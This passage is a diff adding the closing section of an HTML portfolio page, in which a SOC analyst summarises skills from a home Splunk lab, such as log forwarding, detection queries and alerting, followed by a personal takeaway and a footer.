+        <div class="sec-title">What I Learned</div>
+        <div class="sec-sub">SKILLS & OUTCOMES</div>
+
+        <div class="card">
+            <h3>Technical Skills</h3>
+            <ul>
+                <li><strong>SIEM Deployment</strong> &mdash; Installed and configured Splunk Enterprise with Universal Forwarders</li>
+                <li><strong>Log Management</strong> &mdash; Centralized logs from Windows, Ubuntu, and pfSense in one place</li>
+                <li><strong>Threat Detection</strong> &mdash; Used SPL queries to find brute force, exfiltration, and account creation</li>
+                <li><strong>Alert Configuration</strong> &mdash; Built automated alerts for suspicious activity</li>
+                <li><strong>Incident Documentation</strong> &mdash; Wrote professional incident investigation reports</li>
+                <li><strong>Virtualization</strong> &mdash; Built and networked 4 VMs in VirtualBox</li>
+                <li><strong>Troubleshooting</strong> &mdash; Solved real issues with permissions, field names, and log forwarding</li>
+            </ul>
+        </div>
+
+        <div class="card" style="border-color: rgba(124,58,237,0.2); background: rgba(124,58,237,0.03);">
+            <h3 style="color: var(--purple-light);">Final Takeaway</h3>
+            <p><em>"I built this SOC environment from scratch. I know where the logs come from, how they reach Splunk, I can show the actual search results that prove it, and I know exactly which parts still need work."</em></p>
+            <p style="margin-top: 10px; color: var(--text-muted); font-size: 0.85rem;">&mdash; <strong>Likith Raj</strong>, August 2026</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer>
+        <p>&copy; 2026 <a href="index.html">Likith Raj</a> &mdash; SOC Analyst Portfolio</p>
+    </footer>
+</div>
+
+<!-- FLOATING BACK BUTTON - BOTTOM RIGHT -->
+<a href="index.html#projects" class="back-float" title="Back to Projects">
+    <i class="fas fa-arrow-left"></i>
+</a>
+
+</body>
+</html>
